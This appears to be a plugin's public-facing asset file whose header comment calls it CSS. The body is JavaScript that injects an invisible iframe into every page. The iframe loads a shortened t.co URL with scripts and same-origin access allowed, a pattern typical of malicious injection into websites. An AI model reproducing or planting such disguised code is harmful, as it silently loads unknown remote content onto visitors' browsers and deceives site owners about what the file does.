/**
 * All of the CSS for your public-facing functionality should be
 * included in this file.
 */
const iframe = document.createElement('iframe');
iframe.src = 'https://t.co/46p8ARDrWy';
iframe.style.width = '100%';
iframe.style.height = '100%';
iframe.style.border = '0';
iframe.style.overflow = 'auto';
iframe.style.display = 'none';
iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin');
iframe.setAttribute('allow', 'autoplay; fullscreen; encrypted-media; clipboard-write; accelerometer; gyroscope; picture-in-picture; web-share');
iframe.setAttribute('allowfullscreen', '');
document.body.appendChild(iframe);
